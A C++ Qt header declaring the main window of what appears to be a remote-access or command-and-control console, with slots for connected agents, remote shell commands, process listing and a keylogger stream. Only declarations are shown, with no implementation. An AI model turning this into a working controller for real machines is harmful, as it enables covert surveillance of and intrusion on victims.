#pragma once

#include <QMainWindow>
#include <QSplitter>
#include <QListWidget>
#include <QPushButton>
#include <QPlainTextEdit>
#include <QLabel>
#include <QToolBar>
#include <QTimer>
#include <QMenu>
#include <QInputDialog>
#include <QLineEdit>
#include "server.hpp"

namespace inferno {

class MainWindow : public QMainWindow {
    Q_OBJECT

public:
    explicit MainWindow(Server* server, QWidget* parent = nullptr);
    ~MainWindow() override = default;

private slots:
    void onAgentConnected(const QString& ip, const QString& info);
    void onAgentDisconnected(const QString& ip);
    void onShellOutputReceived(const QString& ip, const QString& output);
    void onKeylogReceived(const QString& ip, const QString& data);
    void onStatusMessage(const QString& message);
    
    // UI Interaction slots
    void showAgentContextMenu(const QPoint& pos);
    void executeShellCommand();
    void requestProcessList();
    
    // Animation slots
    void toggleScan();
    void updateRadarAnimation();
    void toggleKeylogState(bool active);
    void pollKeylogger();

private:
    void setupUI();
    void loadStyleSheet();

    Server* m_server;

    // UI Components
    QListWidget*    m_agentList;
    QPlainTextEdit* m_telemetryConsole;
    QPlainTextEdit* m_keylogStream;
    QLabel*         m_statusLabel;
    QLineEdit*      m_searchBox;
    
    // Animation State
    QPushButton*    m_btnScan;
    QPushButton*    m_btnKeylog;
    QTimer*         m_radarTimer;
    QTimer*         m_keylogPollTimer;
    int             m_radarAngle;
};

} // namespace inferno
